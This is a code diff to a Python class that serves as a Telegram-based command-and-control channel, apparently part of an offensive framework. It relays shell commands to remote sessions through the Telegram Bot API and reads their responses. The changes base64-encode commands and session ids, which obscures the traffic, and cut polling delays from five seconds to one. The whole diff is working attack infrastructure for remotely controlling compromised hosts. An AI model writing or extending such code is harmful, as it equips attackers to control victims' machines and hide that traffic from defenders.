@@ -82,6 +82,7 @@ class Telegram:
                                 response = re.findall(r'\,\"v\"\:\"(.*?)\"', text, re.DOTALL)[0]
                                 print(f"C2 Telegram  receiver - s_key: {s_key}, command: {command}, response: {response}, message: {message}")
                                 message = response.replace("\n", "")
+                                command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
                                 payload_key = "payload_details_" + s_key
                                 payload_data = {"session_id": s_key, "shell": "$", "command": command, "command_date": dt, "response": message, "response_date": dt}
                                 serialized_data = json.dumps(payload_data)
@@ -97,7 +98,7 @@ class Telegram:
                             print(f"C2 Telegram receiver - error: {e}")
                             message = {}
                     offset = update['update_id'] + 1
-            time.sleep(5)
+            time.sleep(1)
 
     def subscriber(self):
         print(f"C2 Telegram subscriber")
@@ -107,18 +108,20 @@ class Telegram:
                 print(f"C2 Telegram subscriber listening - pubsub: {self.telegram_pubsub}, messages: {messages}")
                 if messages and messages['type'] == 'message':
                     data = json.loads(messages['data'].decode('utf-8'))
-                    command = data["command"]
+                    command = base64.b64decode(data["command"]).decode("utf-8")
+                    session_id = data["session_id"]
+                    text = base64.b64encode(("sid="+session_id+",c0mnd="+command).encode('utf-8'))
                     print(f"C2 Telegram subscriber - redis_subscriber data: {data}, command: {command}")
                     url = f'https://api.telegram.org/bot{self.bot_token}/sendMessage'
                     params = {
                         'chat_id': self.bot_chat_id,
-                        'text': command
+                        'text': text
                     }
                     response = requests.get(url, params=params)
                     print(f"C2 Telegram subscriber - command: {command}, status: {response.status_code}, response: {response.text}")
             except Exception as e:
                 print(f"C2 Telegram subscriber - subscriber: websocket close {e}")
-            time.sleep(5)
+            time.sleep(1)
 
     def start_server(self):
         subscriber_thred = threading.Thread(target=self.subscriber, args=())
